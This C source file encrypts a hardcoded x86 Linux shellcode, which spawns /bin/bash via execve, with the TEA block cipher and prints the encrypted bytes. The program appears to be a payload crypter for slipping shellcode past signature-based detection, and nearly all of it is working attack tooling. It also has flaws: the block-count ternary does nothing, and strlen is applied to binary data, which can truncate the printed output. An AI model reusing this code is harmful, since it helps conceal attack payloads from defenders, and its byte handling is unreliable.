#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>



/* This function is used to encrypt a message. The message is divided in 64 bits blocks and then encrypt with the 128 bits key.
:param uint32_t v[2] -> the message to encrypt:
:param uint32_t k[4] -> the key used to encrypt:
*/
void encrypt (uint32_t v[2], uint32_t k[4]) 
{

    uint32_t v0=v[0], v1=v[1], sum=0, i;           // set up //

    uint32_t delta=0x9E3779B9;                     // a key schedule constant //

    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   // cache key //


    for (i=0; i < 32; i++) {                       // basic cycle start //
        sum += delta;
        v0 += ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
        v1 += ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);
    }                                              // end cycle //
                                              
    v[0]=v0; 
    v[1]=v1;                                       
}

/* This function is used to divided the shellcode in block of 64 bits and then call the encrypt function.
:param char *shellcode  -> the shellcode to encrypt:
:param uint32_t k[4]    -> the key used to encrypt:
*/
void encryptBlocks(char *shellcode, uint32_t *key)
{   
    // Declare variables
    int i = 0, blockcount;
    
    // Devide the shellcode in blockcount
    // 8 is the number of Bytes (8 * 8 == 64 bits)
    blockcount = strlen(shellcode) / 8;

    // Conditionnal ternary operator
    // --> Check if the blockcount == 0
    //     --> if so: blockcount == 1
    //     --> else: blockcount = blockcount
    blockcount = 0 ? 1 : blockcount;

    // For each block of 64 bits the shellcode is encrypted with the given key
    while (i < blockcount) {
        encrypt((uint32_t *)shellcode + (i * 2), key);
        i += 1;
    }
}


/* This function is used to get the shellcode length and print it
:param char *shellcode -> the shellcode used:
*/
void printShellcode(char *shellcode)
{
    int i;
    // Print the shellcode length
    printf("Shellcode length = %d\n", strlen(shellcode));
    // Loop for each element in the shellcode array
    for(i = 0; i < strlen(shellcode); i++)
    {
        // Print their hexadecimal values
        printf("\\x%02x", (unsigned char)(int)shellcode[i]);
    }
    // Add a newline
    printf("\n");
}


int main()
{
    // 128 bits encrypt key (32 * 4 bits)
    // A PRETTY BAD IDEA TO HARDCODE IT IN THE CODE
    uint32_t key[4] = {0xAAAAAAAA, 0xBBBBBBBB, 0xCCCCCCCC, 0xDDDDDDDD};

    // Shellcode to encrypt
    unsigned char shellcode[] = "\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\x8d\x1e\x8d\x4e\x0a\x8d\x56\x0e\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68";

    // Encrypt the shellcode
    encryptBlocks(shellcode, key);

    // Print the encrypted shellcode
    printShellcode(shellcode);

    return 0;
}
